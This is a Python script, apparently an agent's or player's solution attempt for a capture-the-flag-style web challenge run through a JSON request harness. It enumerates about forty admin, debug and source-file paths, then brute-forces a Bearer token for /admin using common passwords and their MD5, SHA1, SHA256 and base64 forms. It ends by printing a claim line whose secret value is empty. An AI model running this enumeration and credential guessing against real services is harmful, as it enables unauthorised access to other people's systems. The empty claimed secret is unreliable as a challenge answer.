import json, sys, base64, hashlib, hmac

def req(method, path, headers=None, body=None):
    m = {"http": {"method": method, "path": path}}
    if headers:
        m["http"]["headers"] = headers
    if body is not None:
        m["http"]["body"] = body
    sys.stdout.write(json.dumps(m) + "\n")
    sys.stdout.flush()
    line = sys.stdin.readline()
    if not line:
        return None
    r = json.loads(line)
    b = r.get("body_b64")
    t = ""
    if b:
        try:
            t = base64.b64decode(b).decode("utf-8", "replace")
        except Exception:
            t = ""
    hdrs = r.get("headers") or {}
    return (r.get("status"), t.replace("\n", " ")[:300], hdrs)

log = []
def show(tag, res):
    if res is None:
        log.append(tag + "|NOREP")
        return
    st, t, h = res
    if st == 404 and "not found" in t:
        return
    extra = ""
    if h:
        extra = " H=" + json.dumps({k: v for k, v in h.items() if k.lower() in ("www-authenticate", "set-cookie", "x-session", "x-token", "hint")})
    log.append(tag + "|" + str(st) + "|" + t + extra)

paths = ["/", "/health", "/login", "/token", "/session", "/tokens", "/new", "/admin", "/admin/", "/admin/secret",
         "/adminarea", "/api", "/api/token", "/api/session", "/api/login", "/api/admin", "/issue", "/auth/token",
         "/index", "/index.html", "/app", "/info", "/src", "/code", "/debug", "/routes", "/help", "/doc", "/docs",
         "/admin/token", "/session/new", "/login?user=admin", "/token?user=admin", "/admin?role=admin",
         "/admin?token=admin", "/admin?debug=1", "/admin?help=1", "/admin?source", "/source.py", "/app.py", "/server.py"]
for p in paths:
    show("GET " + p, req("GET", p))

# try derived tokens for admin
cands = []
for s in ["admin", "admin:admin", "admin/admin", "adminadmin", "user=admin", "admin:password", "password", "secret"]:
    cands.append(s)
    cands.append(hashlib.md5(s.encode()).hexdigest())
    cands.append(hashlib.sha256(s.encode()).hexdigest())
    cands.append(hashlib.sha1(s.encode()).hexdigest())
    cands.append(base64.b64encode(s.encode()).decode())
ok = []
for c in cands:
    r = req("GET", "/admin", {"Authorization": "Bearer " + c})
    if r and r[0] not in (401, 403, 404):
        ok.append((c, r[0], r[1][:300]))
log.append("AUTH OK: " + json.dumps(ok)[:1500])

sys.stderr.write("\n".join(log) + "\n")
print('CLAIM:{"secret_hex": ""}')